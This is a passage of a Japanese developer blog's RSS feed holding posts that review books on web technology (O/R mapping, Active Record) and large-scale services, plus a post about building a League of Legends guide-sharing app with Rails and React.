&lt;p> 先月、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B4%F0%CB%DC%BE%F0%CA%F3%B5%BB%BD%D1%BC%D4%BB%EE%B8%B3">基本情報技術者試験&lt;/a>をうけました。（受かってるといいな） &lt;/p>
&lt;p>午後の問題は現代文の試験かな？というのもありましたが、CPU、メモリ、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B2%BE%C1%DB%A5%E1%A5%E2%A5%EA">仮想メモリ&lt;/a>ページングとか&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0">アルゴリズム&lt;/a>、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%C8%EB%CC%A9%B8%B0">秘密鍵&lt;/a>、公開鍵、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%C8%A5%B3%A5%EB">プロトコル&lt;/a>あたりは基礎体力をつけるのにいい内容が範囲に含まれていたかなと思っています。&lt;/p>
&lt;p>その流れで&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Web%A5%B5%A1%BC%A5%D3%A5%B9">Webサービス&lt;/a>の技術のあやふやが多いな〜と感じたのでこちらの本を読みました。&lt;/p>
&lt;div class="freezed">
&lt;div class="hatena-asin-detail">
&lt;a href="http://www.amazon.co.jp/exec/obidos/ASIN/4774142352/hatena-blog-22/">&lt;img class="hatena-asin-detail-image" title="「プロになるためのWeb技術入門」 ――なぜ、あなたはWebシステムを開発できないのか" src="https://images-fe.ssl-images-amazon.com/images/I/61YVe2oD4CL._SL160_.jpg" alt="「プロになるためのWeb技術入門」 ――なぜ、あなたはWebシステムを開発できないのか">&lt;/a>
&lt;div class="hatena-asin-detail-info">
&lt;p class="hatena-asin-detail-title">&lt;a href="http://www.amazon.co.jp/exec/obidos/ASIN/4774142352/hatena-blog-22/">「プロになるためのWeb技術入門」 ――なぜ、あなたはWebシステムを開発できないのか&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;span class="hatena-asin-detail-label">作者:&lt;/span> 小森裕介&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">出版社/メーカー:&lt;/span> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B5%BB%BD%D1%C9%BE%CF%C0%BC%D2">技術評論社&lt;/a>
&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">発売日:&lt;/span> 2010/04/10&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">メディア:&lt;/span> 大型本&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">購入&lt;/span>: 57人 &lt;span class="hatena-asin-detail-label">クリック&lt;/span>: 1,242回&lt;/li>
&lt;li>&lt;a href="http://d.hatena.ne.jp/asin/4774142352/hatena-blog-22" target="_blank">この商品を含むブログ (35件) を見る&lt;/a>&lt;/li>
&lt;/ul>
&lt;/div>
&lt;div class="hatena-asin-detail-foot"> &lt;/div>
&lt;/div>
&lt;/div>
&lt;p>HTTPや&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Cookie">Cookie&lt;/a>、Sessionといった基本的なことについても丁寧に書かれていたのですが特に関心を持ったのは、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/O/R%A5%DE%A5%C3%A5%D4%A5%F3%A5%B0">O/Rマッピング&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%EC%A1%BC%A5%E0%A5%EF%A1%BC%A5%AF">フレームワーク&lt;/a>についての部分です。&lt;/p>
&lt;p>日々&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/O/R%A5%DE%A5%C3%A5%D4%A5%F3%A5%B0">O/Rマッピング&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%EC%A1%BC%A5%E0%A5%EF%A1%BC%A5%AF">フレームワーク&lt;/a>としてActive Recordを利用しているくせに、そもそもなんで&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/O/R%A5%DE%A5%C3%A5%D4%A5%F3%A5%B0">O/Rマッピング&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%EC%A1%BC%A5%E0%A5%EF%A1%BC%A5%AF">フレームワーク&lt;/a>ってあるの？というのはあやふやでした…&lt;/p>
&lt;h4>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/O/R%A5%DE%A5%C3%A5%D4%A5%F3%A5%B0">O/Rマッピング&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%EC%A1%BC%A5%E0%A5%EF%A1%BC%A5%AF">フレームワーク&lt;/a>の目的&lt;/h4>
&lt;p>本書では&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/RDB">RDB&lt;/a>と&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AA%A5%D6%A5%B8%A5%A7%A5%AF%A5%C8%BB%D8%B8%FE">オブジェクト指向&lt;/a>での表現をイメージで示したあとに&lt;/p>
&lt;blockquote>
&lt;p>このようなリレーショナル・データベース上の表現と、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AA%A5%D6%A5%B8%A5%A7%A5%AF%A5%C8%BB%D8%B8%FE%B8%C0%B8%EC">オブジェクト指向言語&lt;/a>におけるオブジェクトによる表現の違いを「&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%D4%A1%BC%A5%C0%A5%F3%A5%B9">インピーダンス&lt;/a>・ミスマッチ」と呼んでいます。 &lt;/p>
&lt;p>（中略）&lt;/p>
&lt;p>この&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%D4%A1%BC%A5%C0%A5%F3%A5%B9">インピーダンス&lt;/a>・ミスマッチを解決することが、「&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/O/R%A5%DE%A5%C3%A5%D4%A5%F3%A5%B0">O/Rマッピング&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%EC%A1%BC%A5%E0%A5%EF%A1%BC%A5%AF">フレームワーク&lt;/a>」の最大の役割になります。&lt;/p>
&lt;/blockquote>
&lt;p>として、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/RDB">RDB&lt;/a>と&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AA%A5%D6%A5%B8%A5%A7%A5%AF%A5%C8%BB%D8%B8%FE%C0%DF%B7%D7">オブジェクト指向設計&lt;/a>の構造上のミスマッチを解決するために&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/O/R%A5%DE%A5%C3%A5%D4%A5%F3%A5%B0">O/Rマッピング&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%EC%A1%BC%A5%E0%A5%EF%A1%BC%A5%AF">フレームワーク&lt;/a>を使っていると書かれています。 &lt;/p>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AA%A5%D6%A5%B8%A5%A7%A5%AF%A5%C8%BB%D8%B8%FE">オブジェクト指向&lt;/a>での構造の表現は基本的に階層構造です。 オブジェクトは主従関係を持っています。対して、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/RDB">RDB&lt;/a>の表現はというと、ちょっと自分ではうまく&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B8%C0%B8%EC%B2%BD">言語化&lt;/a>できなかったので、こちらの記事から引用します。&lt;/p>
&lt;p>&lt;a href="https://qiita.com/a-suenami/items/de7e3dc0ee91910c8b3d">インピーダンスミスマッチについて本気出して考えてみた - 酔いどれ設計ナイト2019 - Qiita&lt;/a>&lt;/p>
&lt;blockquote>
&lt;ul style="box-sizing: inherit; margin: 1.5em 0px; padding: 0px 0px 0px 1.5em; list-style: disc; line-height: 1.9; color: #333333; font-family: -apple-system, system-ui, 'Segoe UI', 'Helvetica Neue', 'Hiragino Kaku Gothic ProN', メイリオ, meiryo, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: #ffffff; text-decoration-style: initial; text-decoration-color: initial;">
&lt;li style="box-sizing: inherit;">リレーショナルモデルは言うなれば項中心の世界で、その項が何者であるかはその定義域（&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C9%A5%E1%A5%A4%A5%F3">ドメイン&lt;/a>、データ型）によってのみ決まり、項の間に優劣や主従はない。
&lt;ul style="box-sizing: inherit; margin: 0px; padding: 0px 0px 0px 1.5em; list-style: circle; line-height: 1.9;">
&lt;li style="box-sizing: inherit;">項の間の関係はリレーショナル演算によって見出され、逆に言うとそれによってのみ項間の関係は決まる。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>外部キー制約とかありますが、確かに&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/RDB">RDB&lt;/a>の表それ自体には明確な主従性はないですね。 &lt;/p>
&lt;p>この表現のミスマッチを防ぐために登場したのが&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/O/R%A5%DE%A5%C3%A5%D4%A5%F3%A5%B0">O/Rマッピング&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%EC%A1%BC%A5%E0%A5%EF%A1%BC%A5%AF">フレームワーク&lt;/a>ということです。データベースとオブジェクトの対応を定義して、本来&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AA%A5%D6%A5%B8%A5%A7%A5%AF%A5%C8%BB%D8%B8%FE">オブジェクト指向&lt;/a>での表現で扱いづらい&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/RDB">RDB&lt;/a>のデータを&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AA%A5%D6%A5%B8%A5%A7%A5%AF%A5%C8%BB%D8%B8%FE">オブジェクト指向&lt;/a>に落とし込んでくれているんですね。&lt;/p>
&lt;p>そもそもこの2つの表現の差異について考えたこともなかったので、自分は&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/RDB">RDB&lt;/a>に階層的なイメージを持っていたと思います。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/O/R%A5%DE%A5%C3%A5%D4%A5%F3%A5%B0">O/Rマッピング&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%EC%A1%BC%A5%E0%A5%EF%A1%BC%A5%AF">フレームワーク&lt;/a>を通してしか&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/RDB">RDB&lt;/a>のことをみていなかったとも言えますね…&lt;/p>
&lt;h4>Active Recordは&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/O/R%A5%DE%A5%C3%A5%D4%A5%F3%A5%B0">O/Rマッピング&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%EC%A1%BC%A5%E0%A5%EF%A1%BC%A5%AF">フレームワーク&lt;/a>としてなにが優れているのか&lt;/h4>
&lt;p>本書とは直接関係ないですが、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>エンジニアが常に意識しているActive Recordという&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%EC%A1%BC%A5%E0%A5%EF%A1%BC%A5%AF">フレームワーク&lt;/a>は何が優れているのでしょう。&lt;/p>
&lt;p>「プロになるためのWeb技術入門」では&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/O/R%A5%DE%A5%C3%A5%D4%A5%F3%A5%B0">O/Rマッピング&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%EC%A1%BC%A5%E0%A5%EF%A1%BC%A5%AF">フレームワーク&lt;/a>として&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/iBATIS">iBATIS&lt;/a>という&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%EC%A1%BC%A5%E0%A5%EF%A1%BC%A5%AF">フレームワーク&lt;/a>が紹介されています。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>マップファイルというDBのデータとオブジェクトの対応と実際に発行する&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>を書いています。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>を明示的に書くことで細かい注文にも対応できるよう設計されています。  &lt;/p>
&lt;p>それに対してActive Recordは&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%CC%BF%CC%BE">命名&lt;/a>ルールや&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A5%AD%A1%BC%A5%DE">スキーマ&lt;/a>のルールに従う必要がありますが、設定用コードは最小限ですみます。レールにのっていれば&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>をそれほど意識しなくても&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/O/R%A5%DE%A5%C3%A5%D4%A5%F3%A5%B0">O/Rマッピング&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%EC%A1%BC%A5%E0%A5%EF%A1%BC%A5%AF">フレームワーク&lt;/a>の恩恵に預かれるということなんですね。&lt;/p>
&lt;p>まさに設定より規約を重視した設計で&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>らしいと言えます。&lt;a href="#f-f1ef484f" name="fn-f1ef484f" title="参考:Active Record の基礎 - Rails ガイド">*1&lt;/a>もちろんこれに甘えず&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>および&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/RDB">RDB&lt;/a>の知識は絶対に必要だとは思いますが。&lt;/p>
&lt;p> &lt;/p>
&lt;h4>最後に&lt;/h4>
&lt;p>今回のブログでは&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/O/R%A5%DE%A5%C3%A5%D4%A5%F3%A5%B0">O/Rマッピング&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%EC%A1%BC%A5%E0%A5%EF%A1%BC%A5%AF">フレームワーク&lt;/a>についての部分だけ取り上げましたが「プロになるためのWeb技術入門」は様々なWebアプリケーション開発の技術が”なぜ”あるのかを丁寧に説明してくれる本でした。Webアプリケーションの歴史やHTTPからアプリケーションの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>、セキュリティにまで幅広く一冊で言及している本はなかなかないのではないでしょうか。根本の仕組みと考え方が大事ですね。なんでもそうですけど。&lt;/p>
&lt;div class="footnote">
&lt;p class="footnote">&lt;a href="#fn-f1ef484f" name="f-f1ef484f" class="footnote-number">*1&lt;/a>&lt;span class="footnote-delimiter">:&lt;/span>&lt;span class="footnote-text">参考:&lt;a href="https://railsguides.jp/active_record_basics.html#active-record%E3%81%AB%E3%81%8A%E3%81%91%E3%82%8Bcoc-convention-over-configuration">Active Record の基礎 - Rails ガイド&lt;/a>&lt;/span>&lt;/p>
&lt;/div>
&lt;/body></description></item><item><title>大規模サービス技術入門を読みました。ついでにRubyでVB Codeを実装してみた</title><link>https://qwyng.dev/posts/2019/05/03/014637/</link><pubDate>Fri, 03 May 2019 01:46:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/05/03/014637/</guid><description>&lt;body>
&lt;p>&lt;/p>
&lt;div class="hatena-asin-detail">
&lt;a href="http://www.amazon.co.jp/exec/obidos/ASIN/4774143073/hatena-blog-22/">&lt;img src="https://images-fe.ssl-images-amazon.com/images/I/51xlTEcCILL._SL160_.jpg" class="hatena-asin-detail-image" alt="[Web開発者のための]大規模サービス技術入門 ―データ構造、メモリ、OS、DB、サーバ/インフラ (WEB+DB PRESS plusシリーズ)" title="[Web開発者のための]大規模サービス技術入門 ―データ構造、メモリ、OS、DB、サーバ/インフラ (WEB+DB PRESS plusシリーズ)">&lt;/a>&lt;div class="hatena-asin-detail-info">
&lt;p class="hatena-asin-detail-title">&lt;a href="http://www.amazon.co.jp/exec/obidos/ASIN/4774143073/hatena-blog-22/">[Web開発者のための]大規模サービス技術入門 ―データ構造、メモリ、OS、DB、サーバ/インフラ (WEB+DB PRESS plusシリーズ)&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;span class="hatena-asin-detail-label">作者:&lt;/span> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B0%CB%C6%A3%C4%BE%CC%E9">伊藤直也&lt;/a>,田中慎司&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">出版社/メーカー:&lt;/span> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B5%BB%BD%D1%C9%BE%CF%C0%BC%D2">技術評論社&lt;/a>
&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">発売日:&lt;/span> 2010/07/07&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">メディア:&lt;/span> 単行本（ソフトカバー）&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">購入&lt;/span>: 80人 &lt;span class="hatena-asin-detail-label">クリック&lt;/span>: 1,849回&lt;/li>
&lt;li>&lt;a href="http://d.hatena.ne.jp/asin/4774143073/hatena-blog-22" target="_blank">この商品を含むブログ (133件) を見る&lt;/a>&lt;/li>
&lt;/ul>
&lt;/div>
&lt;div class="hatena-asin-detail-foot">&lt;/div>
&lt;/div>
&lt;p>大規模技術サービス入門という本を読みました。扱うデータの総量が大規模になってきたときに想定される問題、その問題に対処する具体的な方法がふんだんに書かれています。&lt;br>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B3%F4%BC%B0%B2%F1%BC%D2%A4%CF%A4%C6%A4%CA">株式会社はてな&lt;/a>さんでやっている（いた？）&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%BF%A1%BC%A5%F3%A5%B7%A5%C3%A5%D7">インターンシップ&lt;/a>の内容がベースになっています。そのため、ある程度複雑な考え方や用語等も説明やイメージを織り交ぜて記載されています。&lt;/p>
&lt;p>重要だと思った点は以下の3つです。&lt;/p>
&lt;ul>
&lt;li>メモリ、OS、IOの動作といった低レイヤの知識&lt;/li>
&lt;li>DBやアプリケーションのサーバーの構成&lt;/li>
&lt;li>計算量を減らすには&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0">アルゴリズム&lt;/a>の知識が必要&lt;/li>
&lt;/ul>
&lt;h1>メモリ、OS、IOの動作といった低レイヤの知識は重要&lt;/h1>
&lt;p>まず本書の最初には、OS、メモリ、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B2%BE%C1%DB%A5%E1%A5%E2%A5%EA">仮想メモリ&lt;/a>、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Linux">Linux&lt;/a>のページキャッシュ、そしてそれらにおける具体的な速度について丁寧な解説がありました。&lt;br>
「メモリ内で計算できないこと」が、いかにパフォーマンスに影響するかが具体的にイメージできるように解説されていました。&lt;br>
ディスクI/Oが多くなると重くなる。メモリの消費は少ないのがベターです。&lt;br>
ちょうど基本情報を受ける前に読んでいたので余計刺さりました。&lt;/p>
&lt;h1>DBやアプリケーションのサーバーの構成&lt;/h1>
&lt;p>スケールが難しいDBサーバーをスケールさせるための構成。その他にもボットのための専用サーバーを用意したり、冗長性のためのDBサーバーのマルチマスタ等具体的な構成が数多く紹介されています。&lt;br>
また、手法に対してメリットだけでなくデメリットも紹介されていました。例えばDBのパーティショニングを使えばDBの分散やキャッシュの効率は高まりますが、その分運用は複雑になります。メモリを増やすで対応できないかを検討する必要もありますし、運用を別の技術で解決できないかを考える必要もあります。（今は&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AF%A5%E9%A5%A6%A5%C9">クラウド&lt;/a>が主流だとは思うので別の知識も必要そうですが）&lt;/p>
&lt;h1>計算量を減らすには&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0">アルゴリズム&lt;/a>の知識が必要&lt;/h1>
&lt;p>二分木探索、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/n-gram">n-gram&lt;/a>インデックスの具体的な利用方法が紹介されていました。&lt;br>
また、メモリにキャッシュしやすくするための圧縮や計算量が大きくなりがちな&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%C1%B4%CA%B8%B8%A1%BA%F7">全文検索&lt;/a>については詳細に解説されています。
実際に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Perl">Perl&lt;/a>で書かれたサンプルコードとともにVBCodeや転地インデックスといって手法をコードに落としこんでいるところまで書いてあります。 &lt;br>
自分も圧縮のときに紹介されていたVBCodeについて&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>で実装してみました。自分のコードで圧縮されたファイルっていいですね。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2FQWYNG%2FVBCode-with-Ruby" title="QWYNG/VBCode-with-Ruby" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/QWYNG/VBCode-with-Ruby">github.com&lt;/a>&lt;/cite>
IOクラスとかシ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%EA%A5%A2%A5%E9">リアラ&lt;/a>イザとかまだまだ勉強不足ですね。&lt;/p>
&lt;h1>まとめ&lt;/h1>
&lt;p>大規模サービスについて想定される問題についての現実的な解決策が惜しげもなく公開されている良書でした。
一番なるほどと思った部分を引用します。&lt;/p>
&lt;blockquote>&lt;p>結局、原因がわかればその原因に対する対応方法は自明なのです。この自明になった対応方法を実践することが、チューニングにほかなりません。&lt;/p>&lt;/blockquote>
&lt;p>サービスが大きくなってきたときに&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DC%A5%C8%A5%EB%A5%CD%A5%C3%A5%AF">ボトルネック&lt;/a>になっているのはなんなのか、メモリにキャシュしきれてないのか、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0">アルゴリズム&lt;/a>が悪くディスクI/Oが多発しているせいなのか、はたまた外部のボット等全く違う要素なのか、正確に判断することが重要です。&lt;br>
そのためにはアプリケーションがどのように動いているか？という基本的かつ全般的なコンピューターやインフラの知識が必要だと感じました。&lt;br>
低レイヤやインフラだけでなく、ボットやリク&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9">エス&lt;/a>トの多い&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/API">API&lt;/a>に対して専用のサーバーを用意するといった、局所性を理解した構成のためには、サービスの理解も重要です。サービスを提供するって大変ですね。&lt;/p>
&lt;/body></description></item><item><title>Riot Games API + Rails + React + Ant design でLeague of Legendでチャンピオンごとにガイドを共有できるwebアプリをつくりました</title><link>https://qwyng.dev/posts/2019/04/23/001755/</link><pubDate>Tue, 23 Apr 2019 00:17:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/04/23/001755/</guid><description>&lt;body>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fguidegg.herokuapp.com%2F" title="Guidegg" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://guidegg.herokuapp.com/">guidegg.herokuapp.com&lt;/a>&lt;/cite>&lt;/p>
&lt;h3>なにができるか&lt;/h3>
&lt;p>チャンピオンを選んでそれぞれ関連する記事を保存できるってだけのアプリです。&lt;br>
&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20190422/20190422235522.png" alt="f:id:sasa5740:20190422235522p:plain" title="f:id:sasa5740:20190422235522p:plain" class="hatena-fotolife" itemprop="image">&lt;/span>&lt;/p>
&lt;p>名前を入れるとインクリメントサーチでキャラが絞り込まれるUIだけ凝りました。もっとアニメーションつけたりしたら面白そう&lt;/p>
&lt;p>アカウントそれぞれで保存していく方式ではなく、みんなが保存したものをみんなが見る形式です。&lt;br>
チャンピオンのデータや現在のフリーチャンピオンとかはRiot Games &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/API">API&lt;/a>を叩いて取得してます。&lt;br>
URLはるだけなので動画ページでも&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Twitter">Twitter&lt;/a>のつぶやきでもなんでも載せれます。 &lt;br>
また、URLを貼ると&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A4%CF%A4%C6%A4%CA%A5%D6%A5%ED%A5%B0">はてなブログ&lt;/a>カードっぽく表示するようにしました。&lt;/p>
&lt;p>&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20190422/20190422235403.png" alt="f:id:sasa5740:20190422235403p:plain" title="f:id:sasa5740:20190422235403p:plain" class="hatena-fotolife" itemprop="image">&lt;/span>&lt;/p>
&lt;h3>なんでつくったか&lt;/h3>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/LOL">LOL&lt;/a>のガイドっていろいろな所にあるし、記事、動画、はたまた一つのツイートと形態も様々ですが、それらをチャンピオンごとにまとめておける or 見れる集約サイトがあると楽だなと。&lt;/p>
&lt;h3>使った技術&lt;/h3>
&lt;p>React及び&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/JavaScript">JavaScript&lt;/a>の勉強を兼ねてreact-&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/rails">rails&lt;/a>を使って&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>のviewにAnt Design を導入して作ってみました。&lt;br>
やっぱり出来のいい&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>が多数用意されてると便利です。 &lt;br>
フロントとサーバー側を分けた構成にしているわけではないのでページ遷移は直接aタグを使っています。悲しい。&lt;br>
ひらがなでもカタカナでも検索できるようにしてあります。&lt;br>
かなり恥ずかしいですが、下記が&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9">ソースコード&lt;/a>です&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2FQWYNG%2FGuideGG" title="QWYNG/GuideGG" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/QWYNG/GuideGG">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>ひらがなをカタカナにするメソッドは&lt;a href="https://qiita.com/mimoe/items/855c112625d39b066c9a">この素晴らしい記事&lt;/a>を参考にしました。&lt;s>コピペですすいません。&lt;/s>&lt;br>
最初にチャンピオンのデータを全部propsで渡してstateにセットして、検索時にはpropsに検索語句でfilterかけてまたstateにセットしてます。&lt;br>
stateは親以外は知らないような構造になるようにし、直接変更しないようにしました。（そうしろってreact&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C1%A5%E5%A1%BC%A5%C8%A5%EA%A5%A2%A5%EB">チュートリアル&lt;/a>でやってた）&lt;/p>
&lt;h3>既知の問題点&lt;/h3>
&lt;p>記事のURLはURLであるかぐらいしかvalidationはってないので、URLがそのチャンピオンに関係あるか？そもそも&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/LOL">LOL&lt;/a>に関係あるか？等々を全く見ていません。&lt;br>
あと最大の問題点は
&lt;b>めんどくさくて記事の削除機能をつくってない&lt;/b>ことですかね。&lt;/p>
&lt;/body></description></item><item><title>「オブジェクト指向設計実践ガイド　～Rubyでわかる 進化しつづける柔軟なアプリケーションの育て方」を読みました</title><link>https://qwyng.dev/posts/2019/04/08/003824/</link><pubDate>Mon, 08 Apr 2019 00:38:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/04/08/003824/</guid><description>&lt;body>
&lt;p>&lt;/p>
&lt;div class="hatena-asin-detail">
&lt;a href="http://www.amazon.co.jp/exec/obidos/ASIN/477418361X/hatena-blog-22/">&lt;img src="https://images-fe.ssl-images-amazon.com/images/I/51-TCt0H4UL._SL160_.jpg" class="hatena-asin-detail-image" alt="オブジェクト指向設計実践ガイド ~Rubyでわかる 進化しつづける柔軟なアプリケーションの育て方" title="オブジェクト指向設計実践ガイド ~Rubyでわかる 進化しつづける柔軟なアプリケーションの育て方">&lt;/a>&lt;div class="hatena-asin-detail-info">
&lt;p class="hatena-asin-detail-title">&lt;a href="http://www.amazon.co.jp/exec/obidos/ASIN/477418361X/hatena-blog-22/">オブジェクト指向設計実践ガイド ~Rubyでわかる 進化しつづける柔軟なアプリケーションの育て方&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;span class="hatena-asin-detail-label">作者:&lt;/span> Sandi Metz,?山泰基&lt;/li>
&lt;li>
